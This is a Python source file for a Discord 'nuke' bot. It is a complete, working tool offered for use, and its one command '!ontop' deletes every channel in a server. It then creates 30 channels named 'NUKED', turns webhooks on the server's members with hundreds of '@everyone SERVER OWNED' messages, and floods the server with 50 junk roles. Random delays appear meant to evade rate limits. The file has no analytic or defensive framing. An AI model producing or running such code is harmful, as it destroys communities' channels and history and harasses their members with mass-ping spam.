import discord
from discord.ext import commands
import asyncio
import random

# ===== CONFIGURATION =====
CONFIG = {
    "command_prefix": "!",
    "command_name": "ontop",

    "delete_delay": (0.05, 0.15),

    "channel_count": 30,
    "channel_name": "NUKED-{}",
    "create_delay": (0.1, 0.2),

    "webhook_name": "Spammer-{}",
    "webhook_spam_count": 100,
    "webhook_spam_delay": 0.15,
    "webhook_messages": [
        "@everyone SERVER OWNED",
        "@here SERVER OWNED",
        "NUKE BY HUNTED",
    ],

    "role_count": 50,
    "role_name": "owned-{}",
    "role_delay": 0.1,
}

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix=CONFIG["command_prefix"], intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Bot prêt : {bot.user} (ID: {bot.user.id})")

@bot.command(name=CONFIG["command_name"])
async def ontop(ctx):
    perms = ctx.author.guild_permissions
    if not (perms.administrator or perms.manage_channels or perms.manage_roles or ctx.author.id == ctx.guild.owner_id):
        return await ctx.send("❌ Erreur : Permissions insuffisantes.")

    guild = ctx.guild

    # Send initial message and delete it quickly
    msg = await ctx.send("⚙️ Début de la suppression des salons...")
    await asyncio.sleep(5)
    try:
        await msg.delete()
    except Exception as e:
        print(f"Failed to delete message: {e}")

    # Delete all channels including the command channel itself
    tasks = []
    for channel in guild.channels:
        try:
            tasks.append(channel.delete())
            await asyncio.sleep(random.uniform(*CONFIG["delete_delay"]))
        except Exception as e:
            print(f"Erreur suppression salon {channel.name}: {e}")
    await asyncio.gather(*tasks, return_exceptions=True)

    # Create channels silently
    channels = []
    for _ in range(CONFIG["channel_count"]):
        try:
            name = CONFIG["channel_name"].format(random.randint(1000, 9999))
            channel = await guild.create_text_channel(name)
            channels.append(channel)
            await asyncio.sleep(random.uniform(*CONFIG["create_delay"]))
        except Exception as e:
            print(f"Erreur création salon: {e}")

    # Create webhooks and spam silently
    webhooks = []
    for channel in channels:
        try:
            webhook_name = CONFIG["webhook_name"].format(random.randint(1, 100))
            webhook = await channel.create_webhook(name=webhook_name)
            webhooks.append(webhook)
        except Exception as e:
            print(f"Erreur création webhook dans {channel.name}: {e}")

    async def spam(webhook):
        for _ in range(CONFIG["webhook_spam_count"]):
            try:
                await webhook.send(content=random.choice(CONFIG["webhook_messages"]), wait=False)
                await asyncio.sleep(CONFIG["webhook_spam_delay"])
            except Exception as e:
                print(f"Erreur envoi message webhook {webhook.name}: {e}")

    await asyncio.gather(*[spam(wh) for wh in webhooks])

    # Create roles silently
    for _ in range(CONFIG["role_count"]):
        try:
            role_name = CONFIG["role_name"].format(random.randint(1, 1000))
            await guild.create_role(name=role_name, color=discord.Color.random())
            await asyncio.sleep(CONFIG["role_delay"])
        except Exception as e:
            print(f"Erreur création rôle: {e}")

# Replace "VOTRE_TOKEN_ICI" with your actual Discord bot token
bot.run("VOTRE_TOKEN_ICI")
